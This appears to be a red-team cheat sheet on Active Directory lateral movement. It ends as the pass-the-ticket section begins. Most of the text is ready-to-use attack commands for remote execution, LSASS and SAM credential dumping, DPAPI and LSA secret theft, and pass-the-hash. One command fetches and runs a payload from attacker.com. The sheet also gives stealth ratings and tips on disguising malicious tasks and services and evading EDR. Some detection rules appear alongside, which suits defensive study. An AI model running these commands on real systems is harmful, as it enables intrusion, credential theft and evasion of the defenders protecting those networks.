# Active Directory Lateral Movement

---

## Remote Execution Methods

### PsExec - SMB-Based Remote Execution

**MITRE ATT&CK**: T1021.002 (Remote Services: SMB/Windows Admin Shares)

#### Sysinternals PsExec

**Mechanism**:
- Uploads executable to ADMIN$ share
- Creates and starts a Windows service
- Communicates over named pipes (typically `\pipe\PSEXESVC`)

**Requirements**:
- SMB (445/tcp) access
- Admin credentials or hash
- ADMIN$ and IPC$ share access
- Service creation rights

**Command Examples**:

```powershell
# Basic execution
PsExec.exe \\TARGET-PC cmd.exe

# With explicit credentials
PsExec.exe \\TARGET-PC -u DOMAIN\user -p Password123 cmd.exe

# Interactive system shell
PsExec.exe \\TARGET-PC -s cmd.exe

# Run specific command
PsExec.exe \\TARGET-PC -u DOMAIN\user -p Password123 ipconfig /all

# Accept EULA automatically (stealth)
PsExec.exe -accepteula \\TARGET-PC cmd.exe

# Copy executable and run
PsExec.exe \\TARGET-PC -c beacon.exe

# Run on multiple targets
PsExec.exe \\@targets.txt cmd.exe
```

**OpSec Considerations**:
- Creates service named "PSEXESVC" (highly detectable)
- Leaves traces in Windows Event Logs (Event ID 7045)
- File artifacts in ADMIN$ share
- Named pipe creation visible to EDR
- **Stealth Rating**: 2/10

#### Impacket psexec.py

**Advantages**:
- Runs from Linux
- Supports Pass-the-Hash
- No file written to disk (semi-fileless)

```bash
# Basic execution with credentials
psexec.py DOMAIN/user:password@192.168.1.100

# Pass-the-Hash
psexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100

# Using AES Kerberos key
psexec.py -aesKey <AES_KEY> DOMAIN/user@192.168.1.100 -k -no-pass

# Specify service name (evasion)
psexec.py -service-name "WindowsUpdate" DOMAIN/user@192.168.1.100

# Execute specific command
psexec.py DOMAIN/user:password@192.168.1.100 "whoami"
```

**Detection Indicators**:
- Event ID 7045: Service installed (System Log)
- Event ID 5145: Network share access (Security Log)
- Event ID 4624: Logon Type 3 (Network)
- Event ID 4688: Process creation (if auditing enabled)
- Sysmon Event ID 1: Process creation
- Sysmon Event ID 13: Registry value set (service creation)
- Named pipe creation: `\pipe\PSEXESVC` or custom name

**Sysmon Detection**:
```xml
<RuleGroup name="PsExec Detection" groupRelation="or">
  <ServiceInstalled onmatch="include">
    <ServiceName condition="contains">PSEXE</ServiceName>
  </ServiceInstalled>
  <FileCreate onmatch="include">
    <TargetFilename condition="contains">\ADMIN$\</TargetFilename>
  </FileCreate>
</RuleGroup>
```

---

### WMI/WMIC Execution

**MITRE ATT&CK**: T1047 (Windows Management Instrumentation)

**Mechanism**:
- Leverages WMI for remote code execution
- Uses DCOM for communication (TCP 135 + dynamic RPC ports)
- Executes as child of WmiPrvSE.exe
- No service creation required

**Requirements**:
- RPC connectivity (135/tcp + high ports)
- WMI access (Remote Enable permission)
- Admin credentials

#### WMIC (Windows Native)

```powershell
# Basic command execution
wmic /node:TARGET-PC /user:DOMAIN\user /password:Password123 process call create "cmd.exe"

# Execute command and retrieve output (using file redirection)
wmic /node:TARGET-PC process call create "cmd.exe /c ipconfig > C:\temp\output.txt"

# Execute from file containing targets
wmic /node:@targets.txt process call create "calc.exe"

# Using NTLM hash (requires pth-toolkit)
pth-wmic --user=DOMAIN/user --pw-nt-hash -U NTHASH //TARGET-PC "process call create cmd.exe"
```

#### PowerShell WMI

```powershell
# Basic execution
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName TARGET-PC -Credential $cred

# Using credentials
$cred = Get-Credential
Invoke-WmiMethod -ComputerName TARGET-PC -Credential $cred -Class Win32_Process -Name Create -ArgumentList "powershell.exe -enc <base64>"

# CIM cmdlets (modern alternative)
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe"} -ComputerName TARGET-PC
```

#### Impacket wmiexec.py

```bash
# With credentials
wmiexec.py DOMAIN/user:password@192.168.1.100

# Pass-the-Hash
wmiexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100

# Execute specific command
wmiexec.py DOMAIN/user:password@192.168.1.100 "whoami"

# Output to file (semi-interactive shell)
wmiexec.py -codec utf-8 DOMAIN/user@192.168.1.100
```

**OpSec Considerations**:
- Parent process: WmiPrvSE.exe (suspicious if spawning unusual children)
- No service creation (stealthier than PsExec)
- Leaves minimal disk artifacts
- Network traffic on RPC ports
- **Stealth Rating**: 6/10

**Detection Indicators**:
- Event ID 4624: Logon Type 3 (Network)
- Event ID 4688: Process creation from WmiPrvSE.exe
- Sysmon Event ID 1: Process creation with parent WmiPrvSE.exe
- Sysmon Event ID 3: Network connection on port 135
- WMI Event Subscription logs (Microsoft-Windows-WMI-Activity/Operational)
- Event ID 5857/5858: WMI activity

**Sysmon Detection**:
```xml
<RuleGroup name="WMI Execution" groupRelation="or">
  <ProcessCreate onmatch="include">
    <ParentImage condition="end with">WmiPrvSE.exe</ParentImage>
    <Image condition="contains any">cmd.exe;powershell.exe;rundll32.exe</Image>
  </ProcessCreate>
</RuleGroup>
```

---

### WinRM/PowerShell Remoting

**MITRE ATT&CK**: T1021.006 (Remote Services: Windows Remote Management)

**Mechanism**:
- Uses WinRM protocol (HTTP/HTTPS)
- Default ports: 5985 (HTTP), 5986 (HTTPS)
- Spawns wsmprovhost.exe on target
- Supports credential delegation (CredSSP)

**Requirements**:
- WinRM service enabled
- Network access to ports 5985/5986
- Admin credentials
- Firewall rules allowing WinRM

#### PowerShell Remoting

```powershell
# Enable WinRM (on target, if accessible)
Enable-PSRemoting -Force

# One-to-One session
Enter-PSSession -ComputerName TARGET-PC -Credential $cred

# Execute command on remote system
Invoke-Command -ComputerName TARGET-PC -Credential $cred -ScriptBlock { whoami }

# Execute script from file
Invoke-Command -ComputerName TARGET-PC -FilePath C:\scripts\beacon.ps1 -Credential $cred

# One-to-Many execution
Invoke-Command -ComputerName DC01,SRV01,WS01 -ScriptBlock { Get-Process } -Credential $cred

# Pass credentials inline
$pass = ConvertTo-SecureString "Password123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("DOMAIN\user", $pass)
Invoke-Command -ComputerName TARGET-PC -Credential $cred -ScriptBlock { hostname }

# Load script into memory and execute
Invoke-Command -ComputerName TARGET-PC -Credential $cred -ScriptBlock {
    IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
}
```

#### Evil-WinRM (Linux)

```bash
# Basic connection
evil-winrm -i 192.168.1.100 -u user -p 'Password123'

# Pass-the-Hash
evil-winrm -i 192.168.1.100 -u user -H NTHASH

# Using SSL
evil-winrm -i 192.168.1.100 -u user -p 'Password123' -S

# Upload file
evil-winrm -i 192.168.1.100 -u user -p 'Password123'
*Evil-WinRM* PS> upload beacon.exe C:\temp\beacon.exe

# Download file
*Evil-WinRM* PS> download C:\temp\loot.txt /tmp/loot.txt

# Load PowerShell script
*Evil-WinRM* PS> Invoke-Binary /path/to/Rubeus.exe
```

**OpSec Considerations**:
- Spawns wsmprovhost.exe (visible to EDR)
- PowerShell logging captures commands (Script Block Logging)
- Network traffic encrypted but identifiable protocol
- Can bypass AppLocker if configured incorrectly
- **Stealth Rating**: 5/10

**Detection Indicators**:
- Event ID 4624: Logon Type 3 (Network)
- Event ID 4688: wsmprovhost.exe process creation
- Event ID 4103: PowerShell Module Logging
- Event ID 4104: PowerShell Script Block Logging
- Sysmon Event ID 1: wsmprovhost.exe creation
- Sysmon Event ID 3: Network connection on 5985/5986
- WinRM Event Logs: Microsoft-Windows-WinRM/Operational
- Event ID 91: Creating WSMan shell

**Sysmon Detection**:
```xml
<RuleGroup name="WinRM Detection" groupRelation="or">
  <ProcessCreate onmatch="include">
    <Image condition="end with">wsmprovhost.exe</Image>
  </ProcessCreate>
  <NetworkConnect onmatch="include">
    <DestinationPort condition="is">5985</DestinationPort>
    <DestinationPort condition="is">5986</DestinationPort>
  </NetworkConnect>
</RuleGroup>
```

---

### DCOM Execution

**MITRE ATT&CK**: T1021.003 (Remote Services: Distributed Component Object Model)

**Mechanism**:
- Leverages DCOM objects for execution
- Uses RPC (port 135 + dynamic high ports)
- Multiple DCOM objects available for abuse
- Often bypasses application whitelisting

**Requirements**:
- RPC connectivity
- Admin credentials
- DCOM enabled (default on Windows)

#### MMC20.Application

```powershell
# Create DCOM object
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET-PC"))

# Execute command
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","Minimized")

# Reverse shell example
$com.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-enc <base64_payload>","Minimized")
```

#### ShellWindows / ShellBrowserWindow

```powershell
# ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}","TARGET-PC"))
$com.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)

# ShellBrowserWindow
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("{C08AFD90-F2A1-11D1-8455-00A0C91F3880}","TARGET-PC"))
$com.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```

#### Impacket dcomexec.py

```bash
# MMC20.Application
dcomexec.py DOMAIN/user:password@192.168.1.100

# Pass-the-Hash
dcomexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100

# Specify DCOM object
dcomexec.py -object MMC20 DOMAIN/user@192.168.1.100

# Execute command
dcomexec.py DOMAIN/user:password@192.168.1.100 "whoami"
```

**OpSec Considerations**:
- No service creation
- Spawns processes from unusual parents (mmc.exe, explorer.exe)
- Less common than PsExec/WMI (lower detection rate)
- Requires specific DCOM permissions
- **Stealth Rating**: 7/10

**Detection Indicators**:
- Event ID 4624: Logon Type 3 (Network)
- Event ID 4688: Process creation from MMC.exe or explorer.exe
- Sysmon Event ID 1: Unusual parent-child process relationships
- Sysmon Event ID 3: Network connection on port 135
- DCOM error logs: Microsoft-Windows-DistributedCOM

**Sysmon Detection**:
```xml
<RuleGroup name="DCOM Execution" groupRelation="or">
  <ProcessCreate onmatch="include">
    <ParentImage condition="end with">mmc.exe</ParentImage>
    <Image condition="contains any">cmd.exe;powershell.exe;rundll32.exe</Image>
  </ProcessCreate>
</RuleGroup>
```

---

### RDP Techniques

**MITRE ATT&CK**: T1021.001 (Remote Services: Remote Desktop Protocol)

**Mechanism**:
- Interactive graphical access
- Default port: 3389/tcp
- Supports Network Level Authentication (NLA)
- Can be used for Pass-the-Hash with Restricted Admin mode

#### Standard RDP

```powershell
# Windows RDP client
mstsc.exe /v:TARGET-PC

# PowerShell
cmdkey /generic:TARGET-PC /user:DOMAIN\user /pass:Password123
mstsc /v:TARGET-PC

# xfreerdp (Linux)
xfreerdp /u:DOMAIN\\user /p:Password123 /v:192.168.1.100 /cert-ignore

# Restricted Admin mode (enables PTH)
xfreerdp /u:user /pth:NTHASH /v:192.168.1.100 /cert-ignore

# With drive redirection
xfreerdp /u:user /p:password /v:192.168.1.100 /drive:share,/tmp /cert-ignore
```

#### RDP with Restricted Admin

```powershell
# Enable Restricted Admin mode (requires registry change on target)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Use PTH via RDP (from Linux)
xfreerdp /u:Administrator /pth:NTHASH /v:192.168.1.100 /cert-ignore +clipboard

# Mimikatz PTH to RDP
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:NTHASH /run:"mstsc.exe /restrictedadmin"
```

**OpSec Considerations**:
- Highly visible (graphical session)
- Creates detailed event logs
- Session recording possible
- Requires user interaction awareness
- **Stealth Rating**: 3/10

**Detection Indicators**:
- Event ID 4624: Logon Type 10 (RemoteInteractive)
- Event ID 4778/4779: Session connected/disconnected
- Event ID 1149: TerminalServices-RemoteConnectionManager
- Event ID 21: TerminalServices-LocalSessionManager (session logon)
- Event ID 25: TerminalServices-LocalSessionManager (session reconnection)
- Sysmon Event ID 3: Network connection on port 3389

---

### Scheduled Tasks

**MITRE ATT&CK**: T1053.005 (Scheduled Task/Job: Scheduled Task)

**Mechanism**:
- Creates scheduled task on remote system
- Executes via Task Scheduler service
- Can be one-time or recurring
- Runs with specified credentials

#### schtasks (Native Windows)

```powershell
# Create scheduled task (immediate execution)
schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c calc.exe" /sc once /st 00:00 /S TARGET-PC /U DOMAIN\user /P Password123
schtasks /run /tn "WindowsUpdate" /S TARGET-PC /U DOMAIN\user /P Password123

# Delete task
schtasks /delete /tn "WindowsUpdate" /S TARGET-PC /U DOMAIN\user /P Password123 /F

# Run as SYSTEM
schtasks /create /tn "WindowsUpdate" /tr "C:\temp\beacon.exe" /sc once /st 00:00 /S TARGET-PC /RU SYSTEM /U DOMAIN\user /P Password123
schtasks /run /tn "WindowsUpdate" /S TARGET-PC

# Create and execute immediately, then delete
schtasks /create /tn "Update" /tr "powershell.exe -enc <base64>" /sc once /st 00:00 /S TARGET-PC /U DOMAIN\user /P Password123
schtasks /run /tn "Update" /S TARGET-PC
timeout /t 5
schtasks /delete /tn "Update" /S TARGET-PC /F
```

#### Impacket atexec.py

```bash
# Execute command via scheduled task
atexec.py DOMAIN/user:password@192.168.1.100 "whoami"

# Pass-the-Hash
atexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100 "ipconfig"

# Execute payload
atexec.py DOMAIN/user:password@192.168.1.100 "powershell.exe -enc <base64>"
```

**OpSec Considerations**:
- Task creation logged in event logs
- Tasks visible in Task Scheduler
- Can specify execution time for delayed execution
- Task names should blend in (e.g., "MicrosoftEdgeUpdate")
- **Stealth Rating**: 4/10

**Detection Indicators**:
- Event ID 4624: Logon Type 3 (Network)
- Event ID 4688: taskeng.exe / taskhostw.exe process creation
- Event ID 4698: Scheduled task created
- Event ID 4702: Scheduled task updated
- Event ID 4699: Scheduled task deleted
- Event ID 4700/4701: Scheduled task enabled/disabled
- Sysmon Event ID 1: Process creation from Task Scheduler
- Microsoft-Windows-TaskScheduler/Operational logs

---

### Service Creation

**MITRE ATT&CK**: T1543.003 (Create or Modify System Process: Windows Service)

**Mechanism**:
- Creates Windows service on remote system
- Service executes with specified privileges
- Requires Service Control Manager access
- Similar to PsExec but manual

#### sc.exe (Native Windows)

```powershell
# Create service
sc \\TARGET-PC create "WindowsUpdate" binPath= "cmd.exe /c calc.exe"

# Start service
sc \\TARGET-PC start "WindowsUpdate"

# Query service status
sc \\TARGET-PC query "WindowsUpdate"

# Delete service
sc \\TARGET-PC delete "WindowsUpdate"

# Create service with credentials
sc \\TARGET-PC create "WinDefend" binPath= "C:\temp\beacon.exe" obj= "NT AUTHORITY\SYSTEM"

# Create service with specific start type
sc \\TARGET-PC create "UpdateService" binPath= "powershell.exe -enc <base64>" start= demand

# Full attack chain
sc \\TARGET-PC create "Update" binPath= "cmd.exe /c C:\temp\payload.exe" start= demand
sc \\TARGET-PC start "Update"
timeout /t 5
sc \\TARGET-PC delete "Update"
```

#### PowerShell Service Creation

```powershell
# Create service remotely
New-Service -Name "WindowsUpdate" -BinaryPathName "cmd.exe /c calc.exe" -ComputerName TARGET-PC -Credential $cred

# Start service
Start-Service -Name "WindowsUpdate" -ComputerName TARGET-PC

# Remove service
Remove-Service -Name "WindowsUpdate" -ComputerName TARGET-PC
```

#### Impacket (via psexec/smbexec with service option)

```bash
# Create service and execute
smbexec.py DOMAIN/user:password@192.168.1.100

# Pass-the-Hash
smbexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100
```

**OpSec Considerations**:
- Service creation highly visible in logs
- Service remains until deleted
- Service name should be convincing
- Consider using existing service names (risky)
- **Stealth Rating**: 3/10

**Detection Indicators**:
- Event ID 7045: Service installed
- Event ID 4697: Service installed (Security log)
- Event ID 7040: Service start type changed
- Event ID 7036: Service entered running/stopped state
- Sysmon Event ID 1: Services.exe child process
- Sysmon Event ID 13: Registry value set (service creation)

---

## Credential Harvesting

### LSASS Dumping

**MITRE ATT&CK**: T1003.001 (OS Credential Dumping: LSASS Memory)

**Mechanism**:
- LSASS process stores credentials in memory
- Dumping LSASS memory reveals plaintext passwords, NTLM hashes, Kerberos tickets
- Requires SYSTEM or Debug privilege (SeDebugPrivilege)

#### Task Manager (GUI)

```
1. Open Task Manager (Ctrl+Shift+Esc)
2. Navigate to Details tab
3. Find lsass.exe
4. Right-click > Create dump file
5. Dump saved to: C:\Users\<user>\AppData\Local\Temp\lsass.DMP
```

**OpSec**: Extremely noisy, triggers many EDR alerts.

#### Procdump (Sysinternals)

```powershell
# Basic dump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Using PID
tasklist | findstr lsass
procdump.exe -accepteula -ma <PID> lsass.dmp

# Silent mode (no output)
procdump.exe -accepteula -ma lsass.exe lsass.dmp -s

# Clone LSASS and dump clone (evasion)
procdump.exe -r -ma lsass.exe lsass.dmp
```

#### Comsvcs.dll (Built-in Windows DLL)

```powershell
# Rundll32 method (OPSEC friendly)
tasklist | findstr lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full

# Example
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 648 C:\temp\dump.bin full
```

**OpSec**: Less detected than Mimikatz, uses signed Microsoft DLL.

#### Mimikatz Direct

```powershell
# Dump LSASS
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Export to file
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit" > creds.txt

# Minidump
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"
```

#### SQLDumper.exe (SQL Server Tool)

```powershell
# If SQL Server is installed
tasklist | findstr lsass
"C:\Program Files\Microsoft SQL Server\<version>\Shared\SqlDumper.exe" <LSASS_PID> 0 0x01100

# Output: SQLDmpr<PID>.mdmp
```

#### ProcDump Alternatives

**Nanodump** (EDR evasion):
```powershell
# Compile and run
nanodump.exe --write C:\temp\lsass.dmp
```

**PPLDump** (bypass PPL protection):
```powershell
# Dump protected LSASS
ppldump.exe lsass.exe lsass.dmp
```

**Dumpert** (direct syscalls):
```powershell
# Bypass usermode hooks
Outflank-Dumpert.exe
```

#### Parsing LSASS Dumps

```bash
# Mimikatz (Windows)
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"

# Pypykatz (Linux/Python)
pypykatz lsa minidump lsass.dmp

# Extract only NTLM hashes
pypykatz lsa minidump lsass.dmp -o lsass_parsed.txt
grep "NT:" lsass_parsed.txt
```

**Detection Indicators**:
- Event ID 4656: Handle to LSASS process requested
- Event ID 10: Sysmon Process Access (SourceImage accessing lsass.exe)
- Sysmon Event ID 10: GrantedAccess: 0x1410 (common for dumps)
- EDR alerts on LSASS handle access
- File creation of .dmp files in suspicious locations

**Sysmon Detection**:
```xml
<RuleGroup name="LSASS Dumping" groupRelation="or">
  <ProcessAccess onmatch="include">
    <TargetImage condition="end with">lsass.exe</TargetImage>
    <GrantedAccess condition="is">0x1410</GrantedAccess>
  </ProcessAccess>
  <FileCreate onmatch="include">
    <TargetFilename condition="contains">.dmp</TargetFilename>
  </FileCreate>
</RuleGroup>
```

---

### SAM/SECURITY/SYSTEM Hives

**MITRE ATT&CK**: T1003.002 (OS Credential Dumping: Security Account Manager)

**Mechanism**:
- SAM database stores local user hashes
- SYSTEM hive contains boot key for decryption
- SECURITY hive contains LSA secrets and cached domain credentials

#### Registry Extraction (Requires Admin)

```powershell
# Save registry hives
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SECURITY C:\temp\security.hive
reg save HKLM\SYSTEM C:\temp\system.hive

# Alternative: export
reg export HKLM\SAM C:\temp\sam.reg
reg export HKLM\SECURITY C:\temp\security.reg
reg export HKLM\SYSTEM C:\temp\system.reg
```

#### Volume Shadow Copy

```powershell
# Create shadow copy
wmic shadowcopy call create Volume='C:\'

# List shadow copies
vssadmin list shadows

# Copy files from shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam.hive
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\temp\security.hive
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive

# Delete shadow copy (cleanup)
vssadmin delete shadows /shadow={SHADOW-ID}
```

#### Remote Extraction (CrackMapExec)

```bash
# Dump SAM database
crackmapexec smb 192.168.1.100 -u user -p password --sam

# Dump LSA secrets
crackmapexec smb 192.168.1.100 -u user -p password --lsa

# Both SAM and LSA
crackmapexec smb 192.168.1.100 -u user -p password --sam --lsa
```

#### Impacket secretsdump.py

```bash
# Dump SAM, LSA, and cached credentials
secretsdump.py DOMAIN/user:password@192.168.1.100

# Pass-the-Hash
secretsdump.py -hashes :NTHASH DOMAIN/user@192.168.1.100

# Dump from local files
secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL

# Dump only NTDS.dit (Domain Controller)
secretsdump.py DOMAIN/user:password@DC-IP -just-dc

# Dump specific user
secretsdump.py DOMAIN/user:password@DC-IP -just-dc-user Administrator

# Dump NTLM history
secretsdump.py DOMAIN/user:password@DC-IP -history
```

#### Parsing Hives Offline

```bash
# Impacket
secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL

# Mimikatz
mimikatz.exe "lsadump::sam /sam:sam.hive /system:system.hive" "exit"
mimikatz.exe "lsadump::secrets /security:security.hive /system:system.hive" "exit"
```

**Detection Indicators**:
- Event ID 4656: Registry access to SAM/SECURITY
- Event ID 4663: Access to SAM/SECURITY registry keys
- Sysmon Event ID 12/13/14: Registry operations on SAM keys
- Shadow copy creation: Event ID 8222 (VSS)
- File creation of .hive files

---

### DPAPI Secrets

**MITRE ATT&CK**: T1555 (Credentials from Password Stores)

**Mechanism**:
- DPAPI (Data Protection API) encrypts user secrets
- Master keys stored in: `%APPDATA%\Microsoft\Protect\{SID}`
- Credential files: `%APPDATA%\Microsoft\Credentials\`
- Requires user's password or domain backup key to decrypt

#### Enumerate DPAPI Blobs

```powershell
# Find DPAPI credential files
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials /s /a

# Find DPAPI master keys
dir C:\Users\*\AppData\Roaming\Microsoft\Protect /s /a

# List saved credentials
cmdkey /list
```

#### Mimikatz DPAPI

```powershell
# Dump DPAPI master keys
mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "exit"

# Decrypt DPAPI blob with master key
mimikatz.exe "dpapi::cred /in:C:\Users\user\AppData\Roaming\Microsoft\Credentials\<BLOB_ID>" "exit"

# Use domain backup key
mimikatz.exe "lsadump::backupkeys /system:DC01 /export" "exit"
mimikatz.exe "dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\{SID}\<MASTERKEY_GUID> /pvk:ntds_capi_0_<GUID>.pvk" "exit"
```

#### SharpDPAPI (C# Tool)

```powershell
# Triage all DPAPI secrets
SharpDPAPI.exe triage

# Dump Chrome credentials
SharpDPAPI.exe chrome

# Dump saved Windows credentials
SharpDPAPI.exe credentials

# Dump RDP credentials
SharpDPAPI.exe rdg

# Dump Wi-Fi passwords
SharpDPAPI.exe wifi

# Use specific master key
SharpDPAPI.exe credentials /mkfile:C:\temp\masterkey
```

#### DonPAPI (Linux)

```bash
# Dump DPAPI secrets from remote system
DonPAPI.py DOMAIN/user:password@192.168.1.100

# Pass-the-Hash
DonPAPI.py -hashes :NTHASH DOMAIN/user@192.168.1.100

# Specific modules
DonPAPI.py DOMAIN/user:password@192.168.1.100 -chrome -rdp
```

**Common DPAPI Secrets**:
- Browser saved passwords (Chrome, Edge, Firefox)
- Windows Credential Manager
- RDP saved credentials (.rdp files)
- Wi-Fi passwords
- EFS certificates
- VPN credentials
- Outlook passwords

**Detection Indicators**:
- Event ID 4663: Access to DPAPI credential files
- Sysmon Event ID 11: File access to `%APPDATA%\Microsoft\Credentials`
- Unusual process accessing DPAPI files

---

### LSA Secrets

**MITRE ATT&CK**: T1003.004 (OS Credential Dumping: LSA Secrets)

**Mechanism**:
- LSA Secrets stored in registry: `HKLM\SECURITY\Policy\Secrets`
- Contains service account passwords, scheduled task credentials, auto-logon passwords
- Encrypted with LSA key

#### Mimikatz LSA Secrets

```powershell
# Dump LSA secrets (requires SYSTEM)
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"

# From registry hives
mimikatz.exe "lsadump::secrets /security:security.hive /system:system.hive" "exit"
```

#### Impacket secretsdump.py

```bash
# Dump LSA secrets
secretsdump.py DOMAIN/user:password@192.168.1.100 -outputfile lsa_secrets

# From local hives
secretsdump.py -security security.hive -system system.hive LOCAL
```

#### CrackMapExec

```bash
# LSA secrets dump
crackmapexec smb 192.168.1.100 -u user -p password --lsa
```

**Common LSA Secrets**:
- `DPAPI_SYSTEM`: System DPAPI master keys
- `$MACHINE.ACC`: Machine account password
- `_SC_{service}`: Service account passwords
- `DefaultPassword`: Auto-logon password
- `NL$KM`: Cached domain credentials encryption key

---

### Windows Credential Manager

**MITRE ATT&CK**: T1555.004 (Credentials from Password Stores: Windows Credential Manager)

**Mechanism**:
- Stores credentials for network resources, websites, applications
- Encrypted with DPAPI
- Accessed via cmdkey or Credential Manager GUI

#### Enumerate Credentials

```powershell
# List stored credentials
cmdkey /list

# PowerShell method
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll()
```

#### Export Credentials

```powershell
# VaultCmd (Windows built-in)
VaultCmd /list
VaultCmd /listschema
VaultCmd /listcreds:"Windows Credentials"

# Export with Mimikatz
mimikatz.exe "vault::list" "exit"

# SharpDPAPI
SharpDPAPI.exe credentials
```

**Detection Indicators**:
- Event ID 5379: Credential Manager credentials read
- Unusual process accessing Credential Manager

---

### Memory Scraping Techniques

**MITRE ATT&CK**: T1056.002 (Input Capture: GUI Input Capture)

#### Process Memory Scraping

```powershell
# Dump all process memory
Get-Process | ForEach-Object {
    procdump.exe -accepteula -ma $_.Id "$($_.Name)_$($_.Id).dmp"
}

# Search memory dumps for patterns
strings *.dmp | Select-String -Pattern "password|pwd|pass|token|api_key"
```

#### Browser Memory Scraping

```powershell
# Dump browser processes
procdump.exe -accepteula -ma chrome.exe chrome.dmp
procdump.exe -accepteula -ma firefox.exe firefox.dmp
procdump.exe -accepteula -ma msedge.exe edge.dmp

# Search for credentials
strings chrome.dmp | Select-String "password"
```

#### Volatility Analysis (Offline)

```bash
# Extract process memory
volatility -f memory.dmp --profile=Win10x64 procdump -p <PID> --dump-dir=./

# Scan for passwords
volatility -f memory.dmp --profile=Win10x64 mimikatz

# Extract clipboard
volatility -f memory.dmp --profile=Win10x64 clipboard

# Extract Chrome history and credentials
volatility -f memory.dmp --profile=Win10x64 chromehistory
```

---

## Pass Attacks

### Pass-the-Hash (PTH)

**MITRE ATT&CK**: T1550.002 (Use Alternate Authentication Material: Pass the Hash)

**Mechanism**:
- NTLM authentication uses hash instead of plaintext password
- Hash format: `DOMAIN\user:RID:LM_HASH:NTLM_HASH:::`
- Works over SMB, WMI, RDP (with Restricted Admin), WinRM

#### Mimikatz PTH

```powershell
# Basic PTH
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:NTHASH /run:cmd.exe" "exit"

# PTH with specific process
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:NTHASH /run:powershell.exe" "exit"

# PTH for RDP (requires Restricted Admin)
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:NTHASH /run:'mstsc.exe /restrictedadmin'" "exit"
```

#### Impacket PTH

```bash
# PsExec with PTH
psexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100

# WMI with PTH
wmiexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100

# SMB with PTH
smbexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100

# DCOM with PTH
dcomexec.py -hashes :NTHASH DOMAIN/user@192.168.1.100

# Secretsdump with PTH
secretsdump.py -hashes :NTHASH DOMAIN/user@192.168.1.100
```

#### CrackMapExec PTH

```bash
# Authenticate with hash
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTHASH

# Execute command
crackmapexec smb 192.168.1.100 -u Administrator -H NTHASH -x "whoami"

# Dump SAM
crackmapexec smb 192.168.1.100 -u Administrator -H NTHASH --sam

# Pass hash to multiple targets
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTHASH --shares
```

#### Evil-WinRM PTH

```bash
# WinRM with hash
evil-winrm -i 192.168.1.100 -u Administrator -H NTHASH
```

#### RDP with PTH (xfreerdp)

```bash
# Restricted Admin required on target
xfreerdp /u:Administrator /pth:NTHASH /v:192.168.1.100 /cert-ignore

# Enable Restricted Admin remotely (requires admin)
crackmapexec smb 192.168.1.100 -u Administrator -H NTHASH -x "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
```

**OpSec Considerations**:
- No password validation on KDC (Kerberos)
- NTLM authentication leaves standard logs
- Hash reuse detectable across multiple systems
- **Stealth Rating**: 6/10

**Detection Indicators**:
- Event ID 4624: Logon Type 3 with NTLM authentication
- Event ID 4672: Special privileges assigned (admin logon)
- Event ID 4776: NTLM authentication attempt (on DC)
- Multiple 4624 events from same user across different systems (lateral movement)
- Unusual logon patterns (time, location, frequency)

---

### Pass-the-Ticket (PTT)

**MITRE ATT&CK**: T1550.003 (Use Alternate Authentication Material: Pass the Ticket)

**Mechanism**:
- Kerberos authentication uses tickets (TGT/TGS)
- Tickets can be extracted and reused
- Tickets in `.kirbi` (Mimikatz/Rubeus) or `.ccache` (Linux) format
